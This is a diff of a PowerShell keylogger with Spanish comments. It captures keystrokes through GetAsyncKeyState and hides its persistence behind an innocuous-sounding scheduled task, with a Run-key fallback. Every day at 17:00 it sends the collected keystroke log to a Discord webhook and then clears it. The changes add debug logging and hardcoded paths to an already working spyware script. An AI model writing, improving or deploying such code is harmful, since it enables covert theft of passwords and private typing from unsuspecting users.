@@ -1,5 +1,5 @@
 # Configuración
-$logFile = "$env:APPDATA\SystemLogs\log.dat"
+$logFile = "C:\Users\marco\OneDrive\Escritorio\logg\log.dat"
 $webhookUrl = $env:DISCORD_WEBHOOK
 $taskName = "SystemLogCollector"
 $sendTimeHour = 17
@@ -7,23 +7,50 @@ $sendTimeMinuteStart = 0
 $sendTimeMinuteEnd = 1
 $sentToday = $false
 
-# Crear directorio de logs si no existe
+# Copiar script para persistencia
+$scriptPath = "C:\Users\marco\OneDrive\Escritorio\logg\logger.ps1"
+try {
+    if (-not [string]::IsNullOrEmpty($PSCommandPath) -and $PSCommandPath -ne $scriptPath) {
+        Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction Stop
+        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Script copiado a $scriptPath a $(Get-Date)" -ErrorAction Stop
+    } elseif ([string]::IsNullOrEmpty($PSCommandPath)) {
+        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[WARN] Ejecutando en modo interactivo; saltando copia a $(Get-Date)" -ErrorAction Stop
+    }
+} catch {
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Copia de script falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
+}
+
+# Crear directorio de logs con fallback
 $logDir = Split-Path $logFile -Parent
 try {
-    if (-not (Test-Path $logDir)) {
-        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-    }
+    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force -ErrorAction Stop | Out-Null }
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Directorio creado: $logDir a $(Get-Date)" -ErrorAction Stop
 } catch {
     $logFile = "$env:TEMP\log.dat"
     $logDir = $env:TEMP
-    New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+    try { 
+        New-Item -ItemType Directory -Path $logDir -Force -ErrorAction Stop | Out-Null 
+        Add-Content -Path "$env:TEMP\debug.txt" -Value "[INFO] Fallback a TEMP: $logDir a $(Get-Date)" -ErrorAction Stop
+    } catch {
+        Add-Content -Path "$env:TEMP\error.txt" -Value "[ERROR] Fallback a TEMP falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
+    }
 }
 
 # Log inicial
-Add-Content -Path $logFile -Value "[INFO] Script iniciado a $(Get-Date)" -ErrorAction SilentlyContinue
-New-Item -Path "$env:TEMP\logger_started.txt" -ItemType File -Force | Out-Null
+try { 
+    Add-Content -Path $logFile -Value "[INFO] Script iniciado a $(Get-Date)" -ErrorAction Stop 
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log inicial escrito a $(Get-Date)" -ErrorAction Stop
+} catch { 
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Log inicial falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
+}
+try { 
+    New-Item -Path "C:\Users\marco\OneDrive\Escritorio\logg\logger_started.txt" -ItemType File -Force -ErrorAction Stop | Out-Null 
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Archivo logger_started.txt creado a $(Get-Date)" -ErrorAction Stop
+} catch { 
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Creación de logger_started.txt falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
+}
 
-# Mapa de teclas para conversión
+# Mapa de teclas
 $keyMap = @{
     8='[BACKSPACE]'; 9='[TAB]'; 13='[ENTER]'; 16='[SHIFT]'; 17='[CTRL]'; 18='[ALT]';
     27='[ESC]'; 32=' '; 48='0'; 49='1'; 50='2'; 51='3'; 52='4'; 53='5'; 54='6'; 55='7'; 56='8'; 57='9';
@@ -31,11 +58,11 @@ $keyMap = @{
     78='N'; 79='O'; 80='P'; 81='Q'; 82='R'; 83='S'; 84='T'; 85='U'; 86='V'; 87='W'; 88='X'; 89='Y'; 90='Z'
 }
 
-# Función para enviar a Discord con reintentos
+# Función para enviar a Discord
 function Send-ToDiscord {
     param($Content)
     if (-not $webhookUrl) {
-        Add-Content -Path $logFile -Value "[ERROR] Webhook de Discord no configurado." -ErrorAction SilentlyContinue
+        try { Add-Content -Path $logFile -Value "[ERROR] Webhook no configurado a $(Get-Date)" -ErrorAction Stop } catch {}
         return
     }
     $chunks = if ($Content.Length -gt 2000) { [regex]::Split($Content, '(?<=.{2000})') } else { @($Content) }
@@ -57,12 +84,13 @@ function Send-ToDiscord {
                 }
                 if ($proxy) { $params.Proxy = $proxy }
                 Invoke-RestMethod @params
+                try { Add-Content -Path $logFile -Value "[INFO] Enviado a Discord a $(Get-Date)" -ErrorAction Stop } catch {}
                 break
             } catch {
                 $retryCount++
-                Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_" -ErrorAction SilentlyContinue
+                try { Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_ a $(Get-Date)" -ErrorAction Stop } catch {}
                 if ($retryCount -eq $maxRetries) {
-                    Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar tras $maxRetries intentos." -ErrorAction SilentlyContinue
+                    try { Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar tras $maxRetries intentos a $(Get-Date)" -ErrorAction Stop } catch {}
                     break
                 }
                 Start-Sleep -Seconds (5 * [math]::Pow(2, $retryCount-1))
@@ -72,28 +100,43 @@ function Send-ToDiscord {
 }
 
 # Configurar persistencia
-$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+try {
+    $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+} catch { 
+    $taskExists = $null 
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Verificación de tarea falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
+}
 if (-not $taskExists) {
     try {
-        $scriptPath = "$env:APPDATA\SystemLogs\logger.ps1"
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Recopila datos del sistema al iniciar sesión" -Force | Out-Null
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction Stop
+        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME -ErrorAction Stop
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ErrorAction Stop
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Recopila datos del sistema al iniciar sesión" -Force -ErrorAction Stop | Out-Null
+        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Tarea programada creada a $(Get-Date)" -ErrorAction Stop
     } catch {
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction SilentlyContinue
+        try { 
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction Stop 
+            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Entrada de registro creada a $(Get-Date)" -ErrorAction Stop
+        } catch {
+            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Persistencia falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
+        }
     }
 }
 
 # Capturar pulsaciones
-Add-Type -TypeDefinition @"
+try {
+    Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class Keyboard {
     [DllImport("user32.dll")]
     public static extern int GetAsyncKeyState(int i);
 }
-"@
+"@ -ErrorAction Stop
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Add-Type ejecutado a $(Get-Date)" -ErrorAction Stop
+} catch {
+    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Add-Type falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
+}
 $logBuffer = @()
 while ($true) {
     Start-Sleep -Milliseconds 60
@@ -108,22 +151,37 @@ while ($true) {
             $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $prefix$char"
             $logBuffer += $log
             if ($logBuffer.Count -ge 10) {
-                Add-Content -Path $logFile -Value $logBuffer -ErrorAction SilentlyContinue
-                $logBuffer = @()
+                try { 
+                    Add-Content -Path $logFile -Value $logBuffer -ErrorAction Stop 
+                    $logBuffer = @() 
+                    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log escrito a $logFile a $(Get-Date)" -ErrorAction Stop
+                } catch { 
+                    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Escritura de log falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
+                }
             }
         }
     }
     if ($logBuffer.Count -gt 0 -and ((Get-Date) -gt (Get-Date).Date.AddDays(1))) {
-        Add-Content -Path $logFile -Value $logBuffer -ErrorAction SilentlyContinue
-        $logBuffer = @()
+        try { 
+            Add-Content -Path $logFile -Value $logBuffer -ErrorAction Stop 
+            $logBuffer = @() 
+            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Buffer vaciado a $(Get-Date)" -ErrorAction Stop
+        } catch { 
+            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Vaciado de buffer falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
+        }
     }
     $currentTime = Get-Date
     if ($currentTime.Hour -eq $sendTimeHour -and $currentTime.Minute -ge $sendTimeMinuteStart -and $currentTime.Minute -lt $sendTimeMinuteEnd -and (Test-Path $logFile) -and -not $sentToday) {
-        $content = Get-Content -Path $logFile -Raw -ErrorAction SilentlyContinue
-        if ($content) {
-            Send-ToDiscord -Content $content
-            Clear-Content -Path $logFile -ErrorAction SilentlyContinue
-            $sentToday = $true
+        try {
+            $content = Get-Content -Path $logFile -Raw -ErrorAction Stop
+            if ($content) {
+                Send-ToDiscord -Content $content
+                Clear-Content -Path $logFile -ErrorAction Stop
+                $sentToday = $true
+                Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log enviado y limpiado a $(Get-Date)" -ErrorAction Stop
+            }
+        } catch { 
+            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Fallo en envío o limpieza: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
         }
     }
     if ($currentTime.Hour -eq 0 -and $currentTime.Minute -eq 0) { $sentToday = $false }
